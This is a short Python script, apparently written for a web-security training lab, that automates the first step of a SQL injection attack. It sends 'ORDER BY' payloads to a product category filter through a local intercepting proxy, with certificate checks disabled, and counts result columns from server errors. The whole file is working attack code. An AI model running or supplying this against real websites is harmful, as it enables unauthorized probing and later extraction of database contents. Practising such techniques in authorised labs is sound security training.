import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_column_number(url):
    path = "/filter?category=Pets"
    for i in range(1, 20):
        sql_payload = "'+ORDER+BY+%s--" % i # construct the payload
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies) # send the payload
        res = r.text # check the response / results

        if "Internal Server Error" in res:
            return i - 1
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Example: %s "www.example.com"' % sys.argv[0])
        exit()
    
    print('[+] Figuring out number of columns...')
    num_col = exploit_sqli_column_number(url)

    if num_col:
        print('[+] The number of columns is ' + str(num_col) + '.')
    else:
        print('[-] The SQLi attack failed.')